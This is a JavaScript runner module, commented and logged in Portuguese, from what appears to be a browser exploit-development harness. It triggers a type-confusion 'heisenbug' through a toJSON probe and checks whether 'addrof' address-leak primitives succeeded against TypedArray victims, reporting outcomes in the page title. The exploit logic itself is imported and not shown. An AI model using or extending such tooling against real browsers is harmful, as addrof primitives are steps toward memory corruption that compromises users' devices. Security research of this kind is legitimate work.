// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_ConfuseReturnedVictimContainer,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_ConfuseReturnedVictimContainer";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (ConfuseReturnedVictimContainer) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_ConfuseReturnedVictimContainer(); 

    logS3(`   Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-CRVC) ERR: ${result.errorOccurred.name}`;
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da ÚLTIMA sonda: ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output (Objeto Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugConfirmedOnContainer = false;
        if (result.toJSON_details && result.toJSON_details.call_number > 1 &&
            result.toJSON_details.this_type === "[object Object]" && 
            result.toJSON_details.action && result.toJSON_details.action.includes("Confused!")) {
            heisenbugConfirmedOnContainer = true;
        }

        let anyAddrofSuccess = false;
        const addrofResults = [
            { name: "Victim A", res: result.addrof_victim_A },
            { name: "Victim B", res: result.addrof_victim_B },
            { name: "Container A", res: result.addrof_controller_A },
            { name: "Container B", res: result.addrof_controller_B }
        ];

        addrofResults.forEach(r => {
            if (r.res && r.res.success) {
                logS3(`     ADDROF ${r.name} SUCESSO! ${r.res.msg}`, "vuln", FNAME_RUNNER);
                anyAddrofSuccess = true;
            } else if (r.res) {
                logS3(`     ADDROF ${r.name} FALHOU: ${r.res.msg}`, "warn", FNAME_RUNNER);
            }
        });


        if (result.toJSON_details && result.toJSON_details.error) { 
            logS3(`     ERRO INTERNO NA SONDA: ${result.toJSON_details.error}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-CRVC) toJSON_ERR`;
        } else if (heisenbugConfirmedOnContainer) {
            logS3(`     !!!! TYPE CONFUSION NO CONTAINER RETORNADO OBSERVADA !!!!`, "critical", FNAME_RUNNER);
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-CRVC) Container TC, Addr Fail`;
            } else {
                 document.title = `Heisenbug (TypedArray-CRVC) Addr SUCCESS!`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC) || document.title.includes("Probing")) {
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-CRVC) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (ConfuseReturnedVictimContainer) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (ConfuseReturnedVictimContainer) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Container TC")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC} Concluído`;
        }
    }
}
